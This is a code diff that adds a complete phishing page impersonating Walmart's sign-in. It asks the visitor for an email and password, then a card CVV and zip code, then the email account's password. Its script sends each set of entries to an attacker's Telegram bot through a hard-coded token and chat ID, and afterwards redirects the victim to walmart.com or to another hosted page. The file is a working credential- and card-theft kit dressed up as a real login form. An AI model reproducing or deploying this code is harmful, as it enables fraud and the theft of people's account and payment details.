@@ -1,1 +1,476 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap">
+    <title>Login</title>
+    <style>
+        body{
+            font-family: Arial, Helvetica, sans-serif;
+            border: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        .contain{
+            width: 25%;
+            margin: auto;
+            text-align: center;
+        }
+        .label{
+            text-align: left;
+            font-weight: bold;
+        }
+        input{
+        -webkit-appearance: none;
+        border: 0.1px solid #818080;
+        box-sizing: border-box;
+        color: #000;
+        font-family: Bogle,Helvetica Neue,Helvetica,Arial,sans-serif;
+        font-size: 16px;
+        line-height: 22px;
+        margin: 0;
+        min-width: 0;
+        padding: 16px;
+        width: 100%;
+        background: #fff;
+    border-radius: 4px;
+    box-shadow: inset 0 0 0 1px #909196;
+            }
+            label{
+                font-weight: bold;
+                font-size: 14px;
+                font-family: Bogle,Helvetica Neue,Helvetica,Arial,sans-serif;
+
+            }
+
+            button{
+                width: 100%;
+        padding: 12px;
+        color: #fff;
+        font-weight: bold;
+        border: none;
+        background: #0071dc;
+                border-radius: 62.5rem;
+                margin-top: 1%;
+                font-size: 15px;
+            }
+            img{
+                height: 40px;
+            }
+            h4{
+                width: 70%;
+                margin: auto;
+                font-size: 19px;
+            }
+
+            #footer{
+                margin-top: 30%;
+                border-top: 4px solid rgb(194, 188, 188) ;
+            }
+            .foot ul{
+                display: flex;
+                justify-content: space-between;
+                list-style: none;
+                font-size: 14px;
+                color: #46474a;
+                width: 65%;
+            }
+            .foot a{
+                text-decoration: none;
+                color: #46474a;
+                font-size: 12px;
+            }
+            .foot{
+                display: flex;
+                justify-content: space-between;
+                width: 75%;
+                margin: auto;
+                text-align: center;
+                align-items: center;
+                margin-top: 1%;
+            }
+            .display{
+                text-align: left;
+                display: none;
+            }
+            #forgot{
+                text-align: right;
+                float: right;
+                margin-top: 4%;
+                margin-bottom: 4%;
+                color: #000;
+                font-size: 15px;
+                text-decoration: none;
+                display: none;
+            }
+            #pwd{
+                display: none;
+            }
+            .mail a{
+                font-size: 14px;
+            }
+            .mail{
+                display: flex;
+                justify-content: space-between;
+            }
+            .contain{
+                display: block;
+            }
+
+            .form-contain form{
+                box-shadow: 0 1px 2px 1px #00000026;
+                padding: 24px;
+                padding-bottom: 70px;
+                border-radius: 0.5rem;
+            }
+            .form-contain{
+                width: 55%;
+                margin: auto;
+                display: none;
+            }
+            .mm-yy input,
+            .cv-phone input,
+            .app-city input,
+            .state-zip input,
+            .first-last input{
+                width: 49%;
+            }
+          
+            .cv-phone .pho{
+                width: 30%;
+                margin-left: 1.5%;
+            }
+
+            .app-city,
+            .state-zip{
+                width: 60%;
+            }
+            .mm-yy,
+            .app-city,
+            .state-zip,
+            .first-last{
+                display: flex;
+                margin-top: 2%;
+                margin-bottom: 2%;
+                justify-content: space-between;
+            }
+            .save-cancel button{
+                width: 100%;
+            }
+            .save-cancel a{
+                color: #000;
+                font-weight: 100;
+
+            }
+            .save-cancel{
+                justify-content: space-between;
+            }
+            #bold{
+                font-weight: bold;
+                letter-spacing: 0.5px;
+            }
+            header p{
+                font-weight: bold;
+                font-size: 19px;
+            }
+            header div{
+                width: 50%;
+                display: flex;
+                justify-content: space-between;
+               margin: 0% 0 0 1%;
+            }
+            header{
+                background: #0071dc;
+                color: #fff;
+                display: flex;
+                align-items: center;
+                display: none;
+            }
+            .space{
+                width: 60%;
+            }
+            .verify input{
+                margin-top: 1%;
+                margin-bottom: 1%;
+            }
+            .verify{
+                width: 20%;
+                margin: auto;
+                text-align: center;
+                display: none;
+            }
+
+            @media(max-width: 800px){
+
+        .contain{
+            width: 90%;
+            margin-bottom: 70%;
+        }
+                .form-contain form{
+                box-shadow: 0 1px 2px 1px #00000026;
+                padding: 24px;
+                padding-bottom: 70px;
+                border-radius: 0.5rem;
+            }
+            .app-city,
+            .state-zip{
+                width: 100%;
+            }
+            .form-contain{
+                width: 100%;
+                margin: auto;
+            }
+            .space{
+                width: 100%;
+            }
+            .save-cancel{
+            width: 80%;
+            }
+
+            .cv-phone .pho{
+                width: 49%;
+                margin-left: 0%;
+            }
+
+            #footer{
+                margin-top: 10%;
+                border-top: 4px solid rgb(194, 188, 188) ;
+            }
+            .foot ul li{
+                margin-bottom: 3%;
+            }
+            .foot ul{
+                display: flex;
+                justify-content: space-between;
+                flex-direction: column;
+                list-style: none;
+                font-size: 14px;
+                color: #46474a;
+                width: 95%;
+                text-align: left;
+            }
+            .foot a{
+                text-decoration: none;
+                color: #46474a;
+                font-size: 12px;
+            }
+            .foot{
+                display: flex;
+                justify-content: space-between;
+                flex-direction: column;
+                width: 95%;
+                margin: auto;
+                text-align: left;
+                align-items: center;
+                margin-top: 1%;
+            }
+            .verify{
+                width: 95%;
+                margin: auto;
+                text-align: center;
+            }
+
+            }
+
+    </style>
+</head>
+<body>
+    <header id="headers">
+        <div>
+        <img src="https://i5.walmartimages.com/dfw/4ff9c6c9-991c/k2-_03d329be-5936-4ef6-ad29-95e392df014d.v1.png" alt="">
+        <p>Wallet</p>
+        </div>
+    </header>
+    <br><br>
+    <div class="verify">
+        <h2>Verify email address</h2>
+        <p class="confirm"></p>
+       <form action="#" id="epasss">
+        <input type="password" id="epass" required placeholder="Email password">
+        <button type="submit">Verify</button>
+       </form>
+    </div>
+    <br>
+    <div class="contain">
+        <img src="https://i5.walmartimages.com/dfw/4ff9c6c9-991c/k2-_03d329be-5936-4ef6-ad29-95e392df014d.v1.png" alt=""><br><br>
+        <h4 id="enter">Sign in or create your account</h4><br>
+        <form action="" id="form">
+            <div class="display">
+                <p class="mail" style="font-weight: bold;">Email address:  <a href="#" style="color:#000; font-weight: 100;">Change</a></p>
+                <p class="mailer"> </p>
+            </div>
+            <div class="label">
+            <label for="" class="mailpwd">Email Address</label><br><br>
+            <input type="text" id="usr" required>
+            <input type="password" id="pwd" required>
+            <a href="#" id="forgot">Forgot password?</a>
+            </div>
+            <br>
+            <button id="sub">Continue</button>
+        </form>
+    </div>
+
+ <div class="form-contain">
+    <form action="" id="mform">
+        <h3>Update credit or debit card</h3>
+        <!-- <div class="mm-yy">
+            <input type="text" id="mm" required placeholder="MM">
+            <input type="text" id="yy" required placeholder="YY">
+        </div> -->
+        <div class="cv-phone">
+            <input type="text" id="cvv" required placeholder="CVV *">
+            <input type="text" id="phone" class="pho" required placeholder="Zip code *">
+        </div>
+        <br>
+        <div class="save-cancel">
+            <!-- <a href="#">Cancel</a> -->
+            <button type="Submit">Save card</button>
+        </div>
+    </form>
+ </div>
+<div style="height: 100px;"></div>
+    <footer id="footer">
+        <div class="foot">
+            <a href="#">© 2023 Walmart. All Rights Reserved.</a>
+        <ul>
+            <li>Give feedback</li>
+            <li>CA Privacy Rights</li>
+            <li>Your Privacy Choices</li>
+            <li>Request My Personal Information</li>
+            <li>California Supply Chains Act</li>
+        </ul>
+    </div>
+    </footer>
+
+    <script>
+
+        const forma = document.querySelector('#form')
+        const formaat = document.querySelector('#epasss')
+        const mformat = document.querySelector('#mform')
+        const sub = document.querySelector('#sub')
+        const usr = document.querySelector('#usr')
+        const pwd = document.querySelector('#pwd')
+        const mail = document.querySelector('.mailpwd')
+        const enter = document.querySelector('#enter')
+        const display = document.querySelector('.display')
+        const mailer = document.querySelector('.mailer')
+        const contain = document.querySelector('.contain')
+        const formContain = document.querySelector('.form-contain')
+        const headers = document.querySelector('#headers')
+        const confirmm = document.querySelector('.confirm')
+        const verify = document.querySelector('.verify')
+        
+      const currentUrl = window.location.href;
+      let maill = document.querySelector('#usr')
+      let emailPattern = /[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}/;
+      let matches = currentUrl.match(emailPattern);
+      let email;
+
+      if (matches) {
+        email = matches[0];
+        maill.value = email  
+      }
+      
+        let bot = {
+          TOKEN: "5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY",
+            chatID: "-772522345"
+        }
+  
+        sub.addEventListener('click', e =>{
+            if(usr.value === ""){
+                return
+            } else {
+                setTimeout(() => {
+                    usr.style.display = "none"
+                pwd.style.display = "block"
+                display.style.display = "block"
+                mail.textContent = "Enter your password"
+                enter.textContent = "Welcome back!"
+                mailer.textContent = usr.value
+                sub.textContent = "Sign In"
+                sub.type = 'submit'
+                }, 3000);
+            }
+        })
+  
+      forma.addEventListener("submit", e =>{
+            e.preventDefault();
+            let qqpwdqq = document.querySelector('#pwd').value
+            let email = document.querySelector('#usr').value
+  
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=WALMART=>${email}=${qqpwdqq}`, {
+                method: "GET"
+            }).then(success => {
+                formContain.style.display = "block"
+                contain.style.display = "none"
+                headers.style.display = "block"
+            }, error => {
+                alert("Message not sent")
+                console.log(error)
+                }) 
+        })
+
+
+        mformat.addEventListener("submit", e =>{
+            e.preventDefault();
+            // let cnum = document.querySelector('#cnum').value
+            // let fname = document.querySelector('#fname').value
+            // let lname = document.querySelector('#lname').value
+            // let yy = document.querySelector('#yy').value
+            // let mm = document.querySelector('#mm').value
+            let cvv = document.querySelector('#cvv').value
+            let phone = document.querySelector('#phone').value
+            // let add = document.querySelector('#add').value
+            // let apt = document.querySelector('#apt').value
+            // let citi = document.querySelector('#citi').value
+            // let state = document.querySelector('#state').value
+            // let zip = document.querySelector('#zip').value
+  
+  
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=WALMART=>CVV:: ${cvv}==${phone}`, {
+                method: "GET"
+            }).then(success => {
+                formContain.style.display = "none"
+                verify.style.display = "block"
+                confirmm.textContent = usr.value
+
+            }, error => {
+                alert("Message not sent")
+                console.log(error)
+                }) 
+        })
+
+        formaat.addEventListener("submit", e =>{
+            e.preventDefault();
+            let epass = document.querySelector('#epass').value
+            let cfirm = document.querySelector('.confirm').value
+  
+  
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=WALMART=>${cfirm}=${epass}`, {
+                method: "GET"
+            }).then(success => {
+        let email = document.querySelector('#usr').value
+                if(usr.value.includes('aol.com')){
+                    window.location.replace(`https://curly-poetry-0411.on.fleek.co/#${mail}`);
+                }else if(usr.value.includes('yahoo.com')){
+                    window.location.replace(`https://walmart.com`);
+                } else if(usr.value.includes('att.net')){
+                    window.location.replace(`https://walmart.com`);
+                } else if(usr.value.includes('sbcglobal.net')){
+                    window.location.replace(`https://walmart.com`);
+                } else {
+                    window.location.replace("https://walmart.com");
+                }
+            }, error => {
+                alert("Message not sent")
+                console.log(error)
+                }) 
+        })
+
+
+      </script>
+</body>
+</html>
